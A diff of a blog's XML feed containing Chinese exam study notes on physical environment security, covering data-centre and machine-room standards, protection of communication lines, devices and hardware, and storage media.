+<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/IDC逻辑组成.jpg" alt></p>
+<p>《互联网数据中心工程技术规范（GB 51195-2016）》（2017.4.1）划分为R1（可用性不小于99.5%），R2（不小于99.9%），R3（不小于99.99%）3个级别，强制性条文简述：</p>
+<ul>
+<li>抗震设防烈度7度以上（含7度）地区，主要电信设备必须经过性能检测合格</li>
+<li>对肌肤安全条件进行全面检查：灭火器材，非燃材料，不同电压的电源设备、电源插座应有明显区别标志。</li>
+</ul>
+<h2 id="CA机房物理安全控制"><a href="#CA机房物理安全控制" class="headerlink" title="CA机房物理安全控制"></a>CA机房物理安全控制</h2><p>《电子政务电子认证服务业务规则规范》，提出规范性要求。</p>
+<ol>
+<li>物理环境按照GM/T 0034要求严格实施，至少每五年进行一次屏蔽室检测</li>
+<li>所有人员应佩戴标识身份的证明</li>
+<li>进出人员留有记录，并妥善、安全的保管。（监控录像、门禁记录）</li>
+<li>建立并执行人员访问制度及程序，对访问人员进行监督和监控</li>
+<li>保护设备免于电源故障或网络通信异常影响</li>
+<li>处理或再利用存储介质，检查是否含有敏感数据，并物理销毁或安全覆盖</li>
+<li>制定相关安全检查、监督策略。</li>
+</ol>
+<h1 id="网络通信线路安全分析与防护"><a href="#网络通信线路安全分析与防护" class="headerlink" title="网络通信线路安全分析与防护"></a>网络通信线路安全分析与防护</h1><h2 id="网络通信线路安全分析"><a href="#网络通信线路安全分析" class="headerlink" title="网络通信线路安全分析"></a>网络通信线路安全分析</h2><p>威胁：</p>
+<ul>
+<li>网络通信线路被切断</li>
+<li>网络通信线路被电磁干扰</li>
+<li>网络通信线路泄漏信息</li>
+</ul>
+<h2 id="网络通信线路安全防护"><a href="#网络通信线路安全防护" class="headerlink" title="网络通信线路安全防护"></a>网络通信线路安全防护</h2><p>两个方面：</p>
+<ul>
+<li>网络通信设备：采取设备冗余</li>
+<li>网络通信线路：采取多路通信</li>
+</ul>
+<h1 id="设备安全分析与防护"><a href="#设备安全分析与防护" class="headerlink" title="设备安全分析与防护"></a>设备安全分析与防护</h1><h2 id="设备实体安全分析"><a href="#设备实体安全分析" class="headerlink" title="设备实体安全分析"></a>设备实体安全分析</h2><ol>
+<li>设备实体环境关联安全威胁</li>
+<li>设备实体被盗取或损害</li>
+<li>设备实体受到电磁干扰</li>
+<li>设备供应链条中断或延缓</li>
+<li>设备实体的固件部分遭受攻击</li>
+<li>设备遭受硬件攻击</li>
+<li>设备实体的控制组件安全威胁</li>
+<li>设备非法外联</li>
+</ol>
+<h2 id="设备实体安全防护"><a href="#设备实体安全防护" class="headerlink" title="设备实体安全防护"></a>设备实体安全防护</h2><p>GB/T 21052-2007，主要技术措施：</p>
+<ol>
+<li>设备的标志和标记</li>
+<li>设备电磁辐射防护</li>
+<li>设备静电及用电安全防护</li>
+<li>设备磁场抗扰</li>
+<li>设备环境安全保护</li>
+<li>设备适应性与可靠性保护（包括：温度、湿度、冲击和碰撞适应性、可靠性、供应链弹性、安全质量保障、安全合规、安全审查）</li>
+</ol>
+<h2 id="设备硬件攻击防护"><a href="#设备硬件攻击防护" class="headerlink" title="设备硬件攻击防护"></a>设备硬件攻击防护</h2><p>主要措施：</p>
+<ol>
+<li>硬剑木马检测（方法：反向分析法、功耗分析法、侧信道分析法）</li>
+<li>硬件漏洞处理</li>
+</ol>
+<h1 id="存储介质安全分析与防护"><a href="#存储介质安全分析与防护" class="headerlink" title="存储介质安全分析与防护"></a>存储介质安全分析与防护</h1><h2 id="存储介质安全分析"><a href="#存储介质安全分析" class="headerlink" title="存储介质安全分析"></a>存储介质安全分析</h2><p>安全威胁：</p>
+<ol>
+<li>存储管理失效</li>
+<li>存储数据泄密</li>
+<li>存储介质及存储设备故障</li>
+<li>存储介质数据非安全删除</li>
+<li>恶意代码攻击</li>
+</ol>
+<h2 id="存储介质安全防护"><a href="#存储介质安全防护" class="headerlink" title="存储介质安全防护"></a>存储介质安全防护</h2><ol>
+<li>强化存储安全管理（专人负责，审批登记、备份、密封、消除数据）</li>
+<li>数据存储加密保存</li>
+<li>容错容灾存储技术（磁盘阵列、双机在线备份、离线备份）</li>
+</ol>
+]]></content>
+      <categories>
+        <category>信息安全工程师软考</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>第4章 网络安全体系与网络安全模型</title>
     <url>/2020/09/16/%E7%AC%AC4%E7%AB%A0-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B/</url>
     <content><![CDATA[<h1 id="网络安全体系概述"><a href="#网络安全体系概述" class="headerlink" title="网络安全体系概述"></a>网络安全体系概述</h1><h2 id="网络安全体系概念"><a href="#网络安全体系概念" class="headerlink" title="网络安全体系概念"></a>网络安全体系概念</h2><p>体系包括：法律法规政策文件、安全策略、组织管理、技术措施、标准规范、安全建设与运营、人员队伍、教育培训、产业生态、安全投入等。</p>
@@ -1514,172 +1680,6 @@ C^d=M mod (P)</script><p>在已知C和P的前提下，由d求M很容易，由M�
 <li>网络安全工程项目验收测评和交付使用</li>
 </ul>
 <h1 id="网络安全体系建设参考案例"><a href="#网络安全体系建设参考案例" class="headerlink" title="网络安全体系建设参考案例"></a>网络安全体系建设参考案例</h1><p>网络安全等级保护体系应用、智慧城市安全体系应用、智能交通网络安全体系应用、ISO 27000信息安全管理体系应用、NIST网络安全框架体系应用等，详细看书P85-P94</p>
-]]></content>
-      <categories>
-        <category>信息安全工程师软考</category>
-      </categories>
-      <tags>
-        <tag>学习笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>第5章 物理环境安全技术</title>
-    <url>/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/</url>
-    <content><![CDATA[<h1 id="物理安全概念与要求"><a href="#物理安全概念与要求" class="headerlink" title="物理安全概念与要求"></a>物理安全概念与要求</h1><h2 id="物理安全威胁"><a href="#物理安全威胁" class="headerlink" title="物理安全威胁"></a>物理安全威胁</h2><p>常见威胁：</p>
-<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/物理安全威胁.jpg" alt></p>
-<a id="more"></a>
-<p>攻击技术：硬件木马、硬件协同的恶意代码、硬件安全漏洞利用、基于软件漏洞攻击硬件实体、基于环境攻击计算机实体。</p>
-<h2 id="物理安全保护"><a href="#物理安全保护" class="headerlink" title="物理安全保护"></a>物理安全保护</h2><ol>
-<li>设备物理安全：有标志和标记、防止电磁信息泄露、抗电磁干扰、安全漏洞等</li>
-<li>环境物理安全：机房选择、防护</li>
-<li>系统物理安全：存储介质，灾备、访问保护</li>
-</ol>
-<p>方法：安全合规、访问控制、安全屏蔽、故障容错、安全监测与预警、供应链安全管理和容灾备份等。</p>
-<h2 id="物理安全规范"><a href="#物理安全规范" class="headerlink" title="物理安全规范"></a>物理安全规范</h2><p>《信息系统物理安全技术要求（GB/T 21052-2007）》分4级保护：</p>
-<ol>
-<li>第一级用户自主保护级提供基本的物理安全保护</li>
-<li>第二级系统审计保护级提供适当的物理安全保护</li>
-<li>第三级安全标记保护级提供较高程度的物理安全保护</li>
-<li>第四级结构化保护级提供更高程度的物理安全保护</li>
-</ol>
-<h1 id="物理环境安全分析与防护"><a href="#物理环境安全分析与防护" class="headerlink" title="物理环境安全分析与防护"></a>物理环境安全分析与防护</h1><ol>
-<li><p><strong> 防火</strong></p>
-<p>理想灭火材料：卤代烷1211和1301灭火剂</p>
-</li>
-<li><p><strong>防水</strong></p>
-<p>不要把机房设置在楼房底层或地下室</p>
-</li>
-<li><p><strong>防震</strong></p>
-</li>
-<li><p><strong>防盗</strong></p>
-<p>报警器和监控、物理访问控制</p>
-</li>
-<li><p><strong>防鼠虫害</strong></p>
-<p>危害：咬坏电缆或引起电源短路</p>
-</li>
-<li><p><strong>防雷</strong></p>
-<p>避雷针及专用防雷设施，设备接地</p>
-</li>
-<li><p><strong>防电磁</strong></p>
-<p>防止电磁干扰，防止信息通过电磁泄漏。措施：接地、屏蔽、选择合适场地</p>
-</li>
-<li><p><strong>防静电</strong></p>
-<p>人员服装、机房温湿度、材料、操作戴防静电手套</p>
-</li>
-<li><p><strong>安全供电</strong></p>
-<p>专用电线路、不间断电源（UPS）、备用发电机</p>
-</li>
-</ol>
-<h1 id="机房安全分析与防护"><a href="#机房安全分析与防护" class="headerlink" title="机房安全分析与防护"></a>机房安全分析与防护</h1><h2 id="机房功能区域组成"><a href="#机房功能区域组成" class="headerlink" title="机房功能区域组成"></a>机房功能区域组成</h2><p>《计算机场地通用规范（GB/T 2887-2011）》（允许一室多用或酌情增减）：</p>
-<ol>
-<li>主要工作房间：主机房、终端室等；</li>
-<li>第一类辅助房间：低压配电间、不间断电源室、空调机室、发电机室、气体钢瓶室、监控室等</li>
-<li>第二类辅助房间：资料室、维修室、技术人员办公室</li>
-<li>第三类辅助房间：储藏室、缓冲间、技术人员休息室、盥洗室</li>
-</ol>
-<h2 id="机房安全等级划分"><a href="#机房安全等级划分" class="headerlink" title="机房安全等级划分"></a>机房安全等级划分</h2><p>《计算机场地通用规范（GB/T 2887-2011）》分为A、B、C三级：</p>
-<ul>
-<li>A：计算机系统运行中断后，会对国家安全、社会秩序、公共利益造成严重损害</li>
-<li>B：计算机系统运行中断后，会对国家安全、社会秩序、公共利益造成较大损害的</li>
-<li>C：不属于A、B级的情况</li>
-</ul>
-<p>安全级别要求：</p>
-<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/安全级别要求-1.jpg" alt></p>
-<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/安全级别要求-2.jpg" alt></p>
-<h2 id="机房场地选择要求"><a href="#机房场地选择要求" class="headerlink" title="机房场地选择要求"></a>机房场地选择要求</h2><ol>
-<li><p>环境安全性</p>
-<p>避开：危险来源区、环境污染区、盐雾区、落雷区</p>
-</li>
-<li><p>地质可靠性</p>
-<p>避开：杂填土、地层断裂、地质不牢靠、有开采价值矿区、低洼、潮湿</p>
-</li>
-<li><p>场地抗电磁干扰性</p>
-<p>避开：无线电干扰源和微波线路的强电磁场干扰场所（不大于800A/m，100e）、强电流冲击</p>
-</li>
-<li><p>应避开强振动源和强噪音源</p>
-<p>避开：振动源、机场、主要道路</p>
-</li>
-<li><p>应避免设在建筑物的高层以及用水设备的下层或隔壁</p>
-</li>
-</ol>
-<h2 id="数据中心建设与设计要求"><a href="#数据中心建设与设计要求" class="headerlink" title="数据中心建设与设计要求"></a>数据中心建设与设计要求</h2><ul>
-<li>超大型数据中心：&gt;=10000个标准机架；重点考虑气候环境、能源供给，优先在气候寒冷、能源充足的一类或气候适宜，能源充足的二类地区。</li>
-<li>大型数据中心：&gt;=3000，&lt;10000标准机架；重点考虑气候环境、能源供给，优先在一类二类地区，也可在气候适宜，靠近能源富集地的三类地区</li>
-<li>中小型数据中心：&lt;3000标准机架；重点考虑市场需求、能源供给，在靠近用户所在地、能源获取便利的地区建设。</li>
-</ul>
-<p>《设计规范》（2018.1.1）将数据中心分为A、B、C三级，强制性条文简述：</p>
-<ul>
-<li>所有设备的金属外壳、各类金属管道、金属线槽、建筑物金属结构必须进行等电位联结并接地（8.4.4）</li>
-<li>耐火等级不应低于二级（13.2.1）</li>
-<li>与气体供能用房在统一建筑内时，两者之间采用耐火极限不低于2.0h的防火隔墙和1.5h的楼板，隔墙上开门采用甲级防火门（13.2.4）</li>
-<li>采用管网式气体或细水雾灭火系统的主机房，应同时设置两组独立的火灾探测器，火灾报警系统英语灭火系统和视频监控系统联动（13.3.1）</li>
-<li>设置气体灭火系统的主机房，应配置专用空气呼吸器或氧气呼吸器（13.4.1）</li>
-</ul>
-<h2 id="互联网数据中心"><a href="#互联网数据中心" class="headerlink" title="互联网数据中心"></a>互联网数据中心</h2><p>IDC六大逻辑组成部分：</p>
-<p><img src="/2020/09/17/%E7%AC%AC5%E7%AB%A0-%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/IDC逻辑组成.jpg" alt></p>
-<p>《互联网数据中心工程技术规范（GB 51195-2016）》（2017.4.1）划分为R1（可用性不小于99.5%），R2（不小于99.9%），R3（不小于99.99%）3个级别，强制性条文简述：</p>
-<ul>
-<li>抗震设防烈度7度以上（含7度）地区，主要电信设备必须经过性能检测合格</li>
-<li>对肌肤安全条件进行全面检查：灭火器材，非燃材料，不同电压的电源设备、电源插座应有明显区别标志。</li>
-</ul>
-<h2 id="CA机房物理安全控制"><a href="#CA机房物理安全控制" class="headerlink" title="CA机房物理安全控制"></a>CA机房物理安全控制</h2><p>《电子政务电子认证服务业务规则规范》，提出规范性要求。</p>
-<ol>
-<li>物理环境按照GM/T 0034要求严格实施，至少每五年进行一次屏蔽室检测</li>
-<li>所有人员应佩戴标识身份的证明</li>
-<li>进出人员留有记录，并妥善、安全的保管。（监控录像、门禁记录）</li>
-<li>建立并执行人员访问制度及程序，对访问人员进行监督和监控</li>
-<li>保护设备免于电源故障或网络通信异常影响</li>
-<li>处理或再利用存储介质，检查是否含有敏感数据，并物理销毁或安全覆盖</li>
-<li>制定相关安全检查、监督策略。</li>
-</ol>
-<h1 id="网络通信线路安全分析与防护"><a href="#网络通信线路安全分析与防护" class="headerlink" title="网络通信线路安全分析与防护"></a>网络通信线路安全分析与防护</h1><h2 id="网络通信线路安全分析"><a href="#网络通信线路安全分析" class="headerlink" title="网络通信线路安全分析"></a>网络通信线路安全分析</h2><p>威胁：</p>
-<ul>
-<li>网络通信线路被切断</li>
-<li>网络通信线路被电磁干扰</li>
-<li>网络通信线路泄漏信息</li>
-</ul>
-<h2 id="网络通信线路安全防护"><a href="#网络通信线路安全防护" class="headerlink" title="网络通信线路安全防护"></a>网络通信线路安全防护</h2><p>两个方面：</p>
-<ul>
-<li>网络通信设备：采取设备冗余</li>
-<li>网络通信线路：采取多路通信</li>
-</ul>
-<h1 id="设备安全分析与防护"><a href="#设备安全分析与防护" class="headerlink" title="设备安全分析与防护"></a>设备安全分析与防护</h1><h2 id="设备实体安全分析"><a href="#设备实体安全分析" class="headerlink" title="设备实体安全分析"></a>设备实体安全分析</h2><ol>
-<li>设备实体环境关联安全威胁</li>
-<li>设备实体被盗取或损害</li>
-<li>设备实体受到电磁干扰</li>
-<li>设备供应链条中断或延缓</li>
-<li>设备实体的固件部分遭受攻击</li>
-<li>设备遭受硬件攻击</li>
-<li>设备实体的控制组件安全威胁</li>
-<li>设备非法外联</li>
-</ol>
-<h2 id="设备实体安全防护"><a href="#设备实体安全防护" class="headerlink" title="设备实体安全防护"></a>设备实体安全防护</h2><p>GB/T 21052-2007，主要技术措施：</p>
-<ol>
-<li>设备的标志和标记</li>
-<li>设备电磁辐射防护</li>
-<li>设备静电及用电安全防护</li>
-<li>设备磁场抗扰</li>
-<li>设备环境安全保护</li>
-<li>设备适应性与可靠性保护（包括：温度、湿度、冲击和碰撞适应性、可靠性、供应链弹性、安全质量保障、安全合规、安全审查）</li>
-</ol>
-<h2 id="设备硬件攻击防护"><a href="#设备硬件攻击防护" class="headerlink" title="设备硬件攻击防护"></a>设备硬件攻击防护</h2><p>主要措施：</p>
-<ol>
-<li>硬剑木马检测（方法：反向分析法、功耗分析法、侧信道分析法）</li>
-<li>硬件漏洞处理</li>
-</ol>
-<h1 id="存储介质安全分析与防护"><a href="#存储介质安全分析与防护" class="headerlink" title="存储介质安全分析与防护"></a>存储介质安全分析与防护</h1><h2 id="存储介质安全分析"><a href="#存储介质安全分析" class="headerlink" title="存储介质安全分析"></a>存储介质安全分析</h2><p>安全威胁：</p>
-<ol>
-<li>存储管理失效</li>
-<li>存储数据泄密</li>
-<li>存储介质及存储设备故障</li>
-<li>存储介质数据非安全删除</li>
-<li>恶意代码攻击</li>
-</ol>
-<h2 id="存储介质安全防护"><a href="#存储介质安全防护" class="headerlink" title="存储介质安全防护"></a>存储介质安全防护</h2><ol>
-<li>强化存储安全管理（专人负责，审批登记、备份、密封、消除数据）</li>
-<li>数据存储加密保存</li>
-<li>容错容灾存储技术（磁盘阵列、双机在线备份、离线备份）</li>
-</ol>
 ]]></content>
       <categories>
         <category>信息安全工程师软考</category>
